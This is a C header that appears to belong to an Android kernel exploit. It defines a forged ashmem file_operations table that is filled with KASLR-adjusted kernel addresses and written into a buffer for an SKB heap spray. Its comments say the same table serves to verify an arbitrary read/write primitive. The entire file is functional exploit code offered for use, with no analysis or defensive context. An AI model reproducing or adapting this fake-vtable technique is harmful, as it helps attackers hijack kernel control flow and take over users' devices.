#ifndef A53X_FOPS_TABLE_H
#define A53X_FOPS_TABLE_H

#include <stddef.h>
#include <stdint.h>
#include <string.h>

#include "target.h"

/*
 * Single source of truth for the forged ashmem file_operations table used by
 * the SKB spray (page.c) and by the ARW verification (chain.c).  Offsets come
 * from the firmware's struct file_operations layout; the image addresses are
 * fixed in target.h and get the KASLR slide added at fill/verify time.  A slot
 * with an image of 0 is intentionally left zero in the table.
 */
#define A53X_FOPS_OFFSET 0x100
#define A53X_FOPS_TABLE_SIZE 0x120

struct a53x_fops_slot {
  size_t offset;
  uint64_t image;
};

static const struct a53x_fops_slot a53x_fops_slots[] = {
    {0x08, ASHMEM_FOPS_08_IMAGE},
    {0x10, ASHMEM_FOPS_10_IMAGE},
    {0x18, ASHMEM_FOPS_18_IMAGE},
    {0x50, ASHMEM_FOPS_50_IMAGE},
    {0x58, ASHMEM_FOPS_58_IMAGE},
    {0x60, ASHMEM_FOPS_60_IMAGE},
    {0x70, ASHMEM_FOPS_70_IMAGE},
    {0x80, ASHMEM_FOPS_80_IMAGE},
    {0xc8, ASHMEM_FOPS_C8_IMAGE},
    {0xe0, ASHMEM_FOPS_E0_IMAGE},
};
#define A53X_FOPS_SLOT_COUNT \
  (sizeof(a53x_fops_slots) / sizeof(a53x_fops_slots[0]))

static inline uint64_t a53x_fops_value(size_t offset, uint64_t slide) {
  for (size_t i = 0; i < A53X_FOPS_SLOT_COUNT; ++i)
    if (a53x_fops_slots[i].offset == offset)
      return a53x_fops_slots[i].image + slide;
  return 0;
}

static inline void a53x_write_fops_table(unsigned char *blob, size_t base,
                                         uint64_t slide) {
  memset(blob + base, 0, A53X_FOPS_TABLE_SIZE);
  for (size_t i = 0; i < A53X_FOPS_SLOT_COUNT; ++i) {
    uint64_t value = a53x_fops_slots[i].image + slide;

    memcpy(blob + base + a53x_fops_slots[i].offset, &value, sizeof(value));
  }
}

#endif